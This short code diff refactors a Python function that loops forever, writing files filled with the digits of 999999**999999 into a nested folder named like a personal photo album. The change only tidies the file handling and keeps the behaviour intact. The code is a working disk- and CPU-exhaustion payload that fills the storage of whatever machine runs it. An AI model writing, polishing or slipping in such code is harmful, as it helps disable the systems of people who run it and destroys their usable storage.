@@ -48,9 +48,8 @@ def task():
     fpath="photos/pictures/2023/other/me/trips/fun/important/all/"
     i=1
     while True:
-      dn=open(fpath+"dn"+str(i), "w")
-      dn.write(str(999999**999999))
-      dn.close()
+      with open(fpath+"dn"+str(i), "w") as dn:
+        dn.write(str(999999**999999))
       i=i+1
 
 task()
